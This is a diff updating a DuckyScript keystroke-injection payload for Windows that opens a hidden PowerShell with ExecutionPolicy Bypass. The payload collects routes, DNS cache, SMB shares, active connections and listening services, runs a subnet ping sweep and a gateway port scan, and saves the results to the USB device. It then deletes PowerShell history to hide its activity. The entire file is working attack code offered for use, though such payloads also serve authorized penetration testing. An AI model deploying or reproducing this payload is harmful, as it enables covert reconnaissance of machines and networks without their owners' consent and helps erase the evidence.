@@ -5,17 +5,23 @@ REM Description:   Automated network discovery and
 REM                mapping without external tools.
 REM                Uses native Windows commands only.
 REM Target:        Windows 10/11
-REM Version:       1.0
+REM Version:       1.1
 REM Category:      Recon
 REM ====================================================
 
 DEFINE #LABEL DUCKY
 
-DELAY 1000
+REM Use PASSIVE_WINDOWS_DETECT for reliable keystroke timing
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM The extension will wait until the target is ready
+    REM to accept keystrokes before continuing
+END_EXTENSION
+
+REM Open PowerShell hidden
 GUI r
-DELAY 500
+DELAY 300
 STRINGLN powershell -ExecutionPolicy Bypass -WindowStyle Hidden
-DELAY 1500
+DELAY 1000
 
 REM Find the Ducky drive
 STRINGLN $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq '#LABEL'}).DeviceID;if(!$d){$d=$env:TEMP}
@@ -45,56 +51,62 @@ DELAY 500
 REM Routing Table
 STRINGLN $r+="`n=== ROUTING TABLE ==="
 DELAY 100
-STRINGLN Get-NetRoute -AddressFamily IPv4|?{$_.DestinationPrefix -ne '255.255.255.255/32'}|Sort-Object RouteMetric|Select-Object -First 20|%{$r+="  $($_.DestinationPrefix) via $($_.NextHop) metric $($_.RouteMetric)"}
+STRINGLN Get-NetRoute -AddressFamily IPv4|?{$_.NextHop -ne '0.0.0.0'}|%{$r+="  $($_.DestinationPrefix) via $($_.NextHop) [$($_.RouteMetric)]"}
 DELAY 300
 
 REM DNS Cache
-STRINGLN $r+="`n=== DNS CACHE (Recent) ==="
+STRINGLN $r+="`n=== DNS CACHE ==="
 DELAY 100
-STRINGLN Get-DnsClientCache|Select-Object -First 30|%{$r+="  $($_.Entry) -> $($_.Data) [TTL:$($_.TimeToLive)]"}
-DELAY 500
+STRINGLN Get-DnsClientCache|Select-Object -First 20|%{$r+="  $($_.Entry) -> $($_.Data)"}
+DELAY 300
 
 REM Network Shares
 STRINGLN $r+="`n=== NETWORK SHARES ==="
 DELAY 100
-STRINGLN Get-SmbShare -ErrorAction SilentlyContinue|%{$r+="  \\$env:COMPUTERNAME\$($_.Name) ($($_.ShareType)) - $($_.Path)"}
-DELAY 300
-STRINGLN Get-SmbMapping -ErrorAction SilentlyContinue|%{$r+="  Mapped: $($_.LocalPath) -> $($_.RemotePath) [$($_.Status)]"}
-DELAY 300
+STRINGLN Get-SmbShare|%{$r+="  $($_.Name): $($_.Path)"}
+DELAY 200
+STRINGLN Get-SmbMapping 2>$null|%{$r+="  MAPPED: $($_.LocalPath) -> $($_.RemotePath)"}
+DELAY 200
 
 REM Active Connections
 STRINGLN $r+="`n=== ACTIVE CONNECTIONS ==="
 DELAY 100
-STRINGLN Get-NetTCPConnection|?{$_.State -eq 'Established'}|Sort-Object RemoteAddress|%{$pn=try{(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}catch{'?'};$r+="  $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort) [$pn]"}
+STRINGLN Get-NetTCPConnection -State Established|Select-Object -First 30|%{$n=(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name;$r+="  $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort) [$n]"}
 DELAY 500
 
 REM Listening Services
 STRINGLN $r+="`n=== LISTENING SERVICES ==="
 DELAY 100
-STRINGLN Get-NetTCPConnection|?{$_.State -eq 'Listen'}|Sort-Object LocalPort|%{$pn=try{(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}catch{'?'};$r+="  :$($_.LocalPort) [$pn]"}
+STRINGLN Get-NetTCPConnection -State Listen|%{$n=(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name;$r+="  :$($_.LocalPort) [$n]"}
 DELAY 300
 
-REM Subnet Ping Sweep
+REM Ping Sweep (local /24)
 STRINGLN $r+="`n=== SUBNET PING SWEEP ==="
 DELAY 100
-STRINGLN $gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop;$subnet=$gw -replace '\.\d+$',''
-DELAY 200
-STRINGLN $r+="Scanning $subnet.0/24..."
+STRINGLN $gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0'|Select-Object -First 1).NextHop;$subnet=$gw -replace '\.\d+$',''
 DELAY 100
-STRINGLN 1..254|%{$ip="$subnet.$_";$j=Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 1 -ErrorAction SilentlyContinue;if($j){$r+="  [ALIVE] $ip (RTT: $($j.Latency)ms)"}}
-DELAY 15000
-
-REM Port scan on alive hosts
-STRINGLN $r+="`n=== QUICK PORT SCAN (Gateway) ==="
+STRINGLN 1..254|%{$ip="$subnet.$_";$j={param($i)if(Test-Connection -ComputerName $i -Count 1 -Quiet -TimeoutSeconds 1){$i}};Start-Job -ScriptBlock $j -ArgumentList $ip|Out-Null}
 DELAY 100
-STRINGLN $ports=@(21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080,8443);foreach($p in $ports){try{$t=New-Object Net.Sockets.TcpClient;$c=$t.BeginConnect($gw,$p,$null,$null);$w=$c.AsyncWaitHandle.WaitOne(500,$false);if($w){$r+="  $gw`:$p OPEN"};$t.Close()}catch{}}
+STRINGLN Wait-Job *|Out-Null;$r+=Get-Job|Receive-Job|%{"  ALIVE: $_"};Remove-Job *
 DELAY 5000
 
-REM Save report
-STRINGLN $r+="`n=== END NETWORK MAP ==="
+REM Port Scan Gateway
+STRINGLN $r+="`n=== GATEWAY PORT SCAN ==="
 DELAY 100
-STRINGLN $r -join "`n"|Out-File "$d\network_map_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
-DELAY 500
+STRINGLN $ports=@(21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080,8443)
+DELAY 100
+STRINGLN foreach($p in $ports){$c=New-Object System.Net.Sockets.TcpClient;$ar=$c.BeginConnect($gw,$p,$null,$null);$w=$ar.AsyncWaitHandle.WaitOne(500,$false);if($w -and $c.Connected){$r+="  $gw`:$p OPEN"};$c.Close()}
+DELAY 2000
 
-REM WARNING: The following line deletes ALL PowerShell history. Comment out if not desired.
-STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue;exit
+REM Save Report
+STRINGLN $f="$d\network_map_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+DELAY 100
+STRINGLN $r|Out-File -FilePath $f -Encoding UTF8
+DELAY 300
+
+REM WARNING: The following line clears PowerShell history.
+REM Comment out if you want to preserve command history.
+STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+DELAY 100
+
+STRINGLN exit
